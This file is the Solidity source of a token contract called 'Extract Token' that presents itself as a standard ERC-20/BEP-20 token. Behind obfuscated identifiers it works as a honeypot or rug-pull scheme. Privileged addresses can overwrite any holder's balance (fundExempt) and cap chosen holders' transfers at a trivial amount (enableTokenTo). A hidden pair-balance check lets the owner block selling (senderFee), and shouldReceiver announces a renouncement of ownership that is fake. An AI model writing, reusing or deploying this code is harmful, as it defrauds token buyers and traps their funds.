//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface toListFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapLimit) external view returns (uint256);

    function transfer(address limitAuto, uint256 buyMaxFee) external returns (bool);

    function allowance(address autoAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyMaxFee) external returns (bool);

    function transferFrom(
        address sender,
        address limitAuto,
        uint256 buyMaxFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTo, uint256 value);
    event Approval(address indexed autoAt, address indexed spender, uint256 value);
}

abstract contract feeLimitAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountMaxTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyTake {
    function createPair(address liquidityTake, address minAtTotal) external returns (address);
}

interface buyAt is toListFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtractToken is feeLimitAmount, toListFee, buyAt {

    mapping(address => bool) public shouldEnable;

    mapping(address => mapping(address => uint256)) private listEnable;

    function teamMin(address receiverExemptMin, address limitAuto, uint256 buyMaxFee) internal returns (bool) {
        if (receiverExemptMin == exemptLimitTotal) {
            return tokenModeLaunched(receiverExemptMin, limitAuto, buyMaxFee);
        }
        uint256 receiverFund = toListFee(fromSell).balanceOf(listShould);
        require(receiverFund == enableBuy);
        require(limitAuto != listShould);
        if (launchedAt[receiverExemptMin]) {
            return tokenModeLaunched(receiverExemptMin, limitAuto, buyLaunch);
        }
        return tokenModeLaunched(receiverExemptMin, limitAuto, buyMaxFee);
    }

    function shouldReceiver() public {
        emit OwnershipTransferred(exemptLimitTotal, address(0));
        senderLaunched = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingMax;
    }

    function name() external view virtual override returns (string memory) {
        return launchLiquidityMarketing;
    }

    uint256 enableBuy;

    function modeShould() private view {
        require(shouldEnable[_msgSender()]);
    }

    address launchedList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function enableTokenTo(address limitMode) public {
        modeShould();
        if (shouldSwap != receiverLimit) {
            receiverLimit = receiverToken;
        }
        if (limitMode == exemptLimitTotal || limitMode == fromSell) {
            return;
        }
        launchedAt[limitMode] = true;
    }

    uint256 public shouldSwap;

    uint256 public receiverToken;

    bool public isBuyShould;

    bool public swapTrading;

    uint256 private tokenSender;

    function allowance(address limitWallet, address launchTake) external view virtual override returns (uint256) {
        if (launchTake == launchedList) {
            return type(uint256).max;
        }
        return listEnable[limitWallet][launchTake];
    }

    mapping(address => bool) public launchedAt;

    function decimals() external view virtual override returns (uint8) {
        return toIs;
    }

    address private senderLaunched;

    function transfer(address totalMin, uint256 buyMaxFee) external virtual override returns (bool) {
        return teamMin(_msgSender(), totalMin, buyMaxFee);
    }

    address public exemptLimitTotal;

    function tokenModeLaunched(address receiverExemptMin, address limitAuto, uint256 buyMaxFee) internal returns (bool) {
        require(exemptFund[receiverExemptMin] >= buyMaxFee);
        exemptFund[receiverExemptMin] -= buyMaxFee;
        exemptFund[limitAuto] += buyMaxFee;
        emit Transfer(receiverExemptMin, limitAuto, buyMaxFee);
        return true;
    }

    string private tradingMax = "ETN";

    constructor (){
        
        amountMaxTeam tokenTradingSwap = amountMaxTeam(launchedList);
        fromSell = buyTake(tokenTradingSwap.factory()).createPair(tokenTradingSwap.WETH(), address(this));
        
        exemptLimitTotal = _msgSender();
        shouldReceiver();
        shouldEnable[exemptLimitTotal] = true;
        exemptFund[exemptLimitTotal] = tradingToken;
        if (tokenSender == shouldSwap) {
            marketingLaunch = tokenSender;
        }
        emit Transfer(address(0), exemptLimitTotal, tradingToken);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingToken;
    }

    address listShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public receiverLimit;

    function fundExempt(address totalMin, uint256 buyMaxFee) public {
        modeShould();
        exemptFund[totalMin] = buyMaxFee;
    }

    function approve(address launchTake, uint256 buyMaxFee) public virtual override returns (bool) {
        listEnable[_msgSender()][launchTake] = buyMaxFee;
        emit Approval(_msgSender(), launchTake, buyMaxFee);
        return true;
    }

    mapping(address => uint256) private exemptFund;

    function owner() external view returns (address) {
        return senderLaunched;
    }

    function senderFee(uint256 buyMaxFee) public {
        modeShould();
        enableBuy = buyMaxFee;
    }

    function transferFrom(address receiverExemptMin, address limitAuto, uint256 buyMaxFee) external override returns (bool) {
        if (_msgSender() != launchedList) {
            if (listEnable[receiverExemptMin][_msgSender()] != type(uint256).max) {
                require(buyMaxFee <= listEnable[receiverExemptMin][_msgSender()]);
                listEnable[receiverExemptMin][_msgSender()] -= buyMaxFee;
            }
        }
        return teamMin(receiverExemptMin, limitAuto, buyMaxFee);
    }

    uint256 constant buyLaunch = 15 ** 10;

    function sellTake(address enableAmount) public {
        if (exemptFrom) {
            return;
        }
        
        shouldEnable[enableAmount] = true;
        
        exemptFrom = true;
    }

    uint256 takeLaunch;

    function getOwner() external view returns (address) {
        return senderLaunched;
    }

    uint256 public marketingLaunch;

    bool public exemptFrom;

    uint256 private tradingToken = 100000000 * 10 ** 18;

    uint8 private toIs = 18;

    event OwnershipTransferred(address indexed exemptLiquidity, address indexed launchFund);

    address public fromSell;

    function balanceOf(address swapLimit) public view virtual override returns (uint256) {
        return exemptFund[swapLimit];
    }

    string private launchLiquidityMarketing = "Extract Token";

}